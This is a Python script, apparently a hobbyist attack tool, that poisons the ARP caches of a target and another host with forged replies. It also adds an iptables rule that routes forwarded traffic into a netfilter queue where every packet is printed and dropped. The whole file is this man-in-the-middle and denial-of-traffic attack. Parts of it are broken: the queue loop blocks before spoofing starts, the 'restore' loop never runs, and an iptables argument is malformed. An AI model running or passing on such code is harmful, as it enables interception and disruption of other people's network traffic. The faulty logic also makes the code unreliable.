#interceptor
import netfilterqueue
import argparse
import time
import scapy.all as scapy
import subprocess
def trap_data_in_queue():
    subprocess.call(['iptables','-I','FORWARD','-j','NFQUEUE','--queue-num 0 '])
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, execute_packet)
    queue.run()

def execute_packet(packet):
    print(packet)
    packet.drop()

#for arpspoofing

#from scapy import http

def spoffer(target_ip,target_mac,spoof_ip):
    spoof_mac=get_mac(spoof_ip)
    a=0
    while True:
        packet1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        packet2 = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip)
        scapy.send(packet1, verbose=False)

        scapy.send(packet2, verbose=False)
        a = a + 2
        print("\r[+] send packets="+str(a),end="")
        time.sleep(1)

def ip_mac():
    parser=argparse.ArgumentParser()
    parser.add_argument('-t','--target',dest='target_ip',help='to specify target ip')
    parser.add_argument('-s','--spoof',dest='spoof_ip',help='to specify fake yourself to that ip')
    parser.add_argument('-tm','--target_mac',dest='target_mac',help='to specify victim mac')


    return parser.parse_args()
def restore(target_ip,target_mac,spoof_ip):
    spoof_mac = get_mac(spoof_ip)
    a=0
    while a==4:
        packet1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
        packet2 = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip, hwsrc=target_mac)
        scapy.send(packet1, verbose=False)
        scapy.send(packet2, verbose=False)
        a=a+1
def get_mac(ip):
    arp_request=scapy.ARP(pdst=ip)

    broadcast=scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    single_packet=broadcast/arp_request
    answer_list=scapy.srp(single_packet,timeout=2,verbose=False)[0]
    return answer_list[0][1].hwsrc
options=ip_mac()
try:
    trap_data_in_queue()
    print("ignore warning message, the program is working fine")
    spoffer(options.target_ip, options.target_mac, options.spoof_ip)
except KeyboardInterrupt:
    print("trl +c detected...... restoring arp table of victime and router...")
    restore(options.target_ip, options.target_mac, options.spoof_ip)
    subprocess.call(['iptables','--flush'])
except IndexError:
    print("check your internet connection or ip and mac you provided")





